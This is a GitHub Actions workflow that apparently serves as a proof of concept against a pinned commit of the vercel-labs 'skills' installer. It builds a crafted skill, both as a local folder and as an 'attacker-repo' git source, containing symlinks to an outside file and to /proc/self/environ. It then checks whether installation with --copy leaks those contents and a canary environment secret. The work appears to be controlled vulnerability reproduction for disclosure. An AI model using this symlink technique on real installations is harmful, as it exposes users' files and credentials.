name: Vercel skills proc environ symlink probe

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  proc-environ-symlink:
    name: Verify proc environ symlink copy on Linux
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Check out lab repo
        uses: actions/checkout@v4

      - name: Set up Node 22
        uses: actions/setup-node@v4
        with:
          node-version: "22"

      - name: Clone target repository
        run: |
          set -euo pipefail
          git clone --depth 1 https://github.com/vercel-labs/skills.git target-skills
          cd target-skills
          git fetch --depth 1 origin c5ad3a85b4d16666974b161131413d08bfef3f7e
          git checkout c5ad3a85b4d16666974b161131413d08bfef3f7e

      - name: Install target dependencies
        working-directory: target-skills
        run: |
          set -euo pipefail
          corepack enable
          corepack prepare pnpm@10.17.1 --activate
          pnpm install --frozen-lockfile

      - name: Run local path symlink canary
        run: |
          set -euo pipefail
          tmp="$(mktemp -d)"
          skill="$tmp/local-skill"
          victim="$tmp/victim-local"
          outside="$tmp/outside-local-secret.txt"
          mkdir -p "$skill" "$victim"
          printf 'CONTROLLED_OUTSIDE_FILE_LOCAL_20260520\n' > "$outside"
          cat > "$skill/SKILL.md" <<'SKILL'
          ---
          name: proc-env-local-poc
          description: controlled local proc environ symlink proof
          ---

          Controlled local symlink proof.
          SKILL
          ln -s "$outside" "$skill/copied-outside-file.txt"
          ln -s /proc/self/environ "$skill/copied-proc-environ.bin"

          (
            cd "$victim"
            env -i \
              HOME="$HOME" \
              PATH="$PATH" \
              CI=1 \
              CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520 \
              node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "$skill" --copy --agent codex --yes
          )

          installed_outside="$victim/.agents/skills/proc-env-local-poc/copied-outside-file.txt"
          installed_proc="$victim/.agents/skills/proc-env-local-poc/copied-proc-environ.bin"
          find "$victim/.agents/skills/proc-env-local-poc" -maxdepth 1 -printf '%f %y %s bytes -> %l\n'
          if [ ! -f "$installed_outside" ] || [ -L "$installed_outside" ]; then
            echo "installed outside file was not copied as a regular file"
            exit 1
          fi
          if ! grep -Fx 'CONTROLLED_OUTSIDE_FILE_LOCAL_20260520' "$installed_outside"; then
            echo "outside file canary was not present in copied file"
            exit 1
          fi
          if [ -e "$installed_proc" ] && [ ! -L "$installed_proc" ]; then
            stat --format='local proc environ copy observation: %F, %s bytes' "$installed_proc"
            if tr '\0' '\n' < "$installed_proc" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520'; then
              echo "local proc environ canary was present"
            else
              echo "local proc environ canary was not present"
            fi
          else
            echo "local proc environ copy was missing or still a symlink"
          fi
          printf 'local outside installed file bytes: '
          wc -c < "$installed_outside"

      - name: Run git source symlink canary
        run: |
          set -euo pipefail
          tmp="$(mktemp -d)"
          repo="$tmp/attacker-repo"
          victim="$tmp/victim-git"
          outside="$tmp/outside-git-secret.txt"
          mkdir -p "$repo/skills/proc-env-git-poc" "$victim"
          printf 'CONTROLLED_OUTSIDE_FILE_GIT_20260520\n' > "$outside"
          cat > "$repo/skills/proc-env-git-poc/SKILL.md" <<'SKILL'
          ---
          name: proc-env-git-poc
          description: controlled git proc environ symlink proof
          ---

          Controlled git symlink proof.
          SKILL
          ln -s "$outside" "$repo/skills/proc-env-git-poc/copied-outside-file.txt"
          ln -s /proc/self/environ "$repo/skills/proc-env-git-poc/copied-proc-environ.bin"
          git -C "$repo" init
          git -C "$repo" config user.email "scioban@wearehackerone.com"
          git -C "$repo" config user.name "Sorin Cioban"
          git -C "$repo" add .
          git -C "$repo" commit -m "Add controlled proc environ symlink skill"

          (
            cd "$victim"
            env -i \
              HOME="$HOME" \
              PATH="$PATH" \
              CI=1 \
              CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520 \
              node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "file://$repo" --skill proc-env-git-poc --copy --agent codex --yes
          )

          installed_outside="$victim/.agents/skills/proc-env-git-poc/copied-outside-file.txt"
          installed_proc="$victim/.agents/skills/proc-env-git-poc/copied-proc-environ.bin"
          find "$victim/.agents/skills/proc-env-git-poc" -maxdepth 1 -printf '%f %y %s bytes -> %l\n'
          if [ ! -f "$installed_outside" ] || [ -L "$installed_outside" ]; then
            echo "installed outside file was not copied as a regular file"
            exit 1
          fi
          if ! grep -Fx 'CONTROLLED_OUTSIDE_FILE_GIT_20260520' "$installed_outside"; then
            echo "outside file canary was not present in copied file"
            exit 1
          fi
          if [ -e "$installed_proc" ] && [ ! -L "$installed_proc" ]; then
            stat --format='git proc environ copy observation: %F, %s bytes' "$installed_proc"
            if tr '\0' '\n' < "$installed_proc" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520'; then
              echo "git proc environ canary was present"
            else
              echo "git proc environ canary was not present"
            fi
          else
            echo "git proc environ copy was missing or still a symlink"
          fi
          printf 'git outside installed file bytes: '
          wc -c < "$installed_outside"
